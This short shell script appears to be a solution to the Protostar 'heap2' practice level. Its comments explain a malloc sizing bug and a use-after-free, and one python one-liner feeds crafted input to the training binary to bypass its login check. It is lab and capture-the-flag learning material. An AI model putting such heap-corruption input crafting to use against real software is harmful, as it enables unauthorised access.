#!/bin/sh
# The problem with the code:
# We're mallocing the size of auth. Problem?
# auth is a pointer, aka 4 bytes. It should've
# been the sizeof(struct auth) which would do
# 40 bytes (32 for name + 4 for int + 4 for termination)
# We can overwrite this by doing one of two things:
# 1. Make a call to auth then free the space. Since
#    our auth pointer still points to that memory space
#    but is "free", we can overwrite it with a call to service
#    This means that we can provide a long string to service,
#    which would subsequently overwrite where auth's auth int is
#    supposed to live, causing the overflow
# 2. We can just do this anyways without the free and provide
#    a long service string after auth, and since auth struct
#    is expecting 40 bytes free service gets pushed into the struct.

python -c 'print "auth admin\nreset\nservice AAAAAAAAAAAAAAAA\nlogin"' | /opt/protostar/bin/heap2
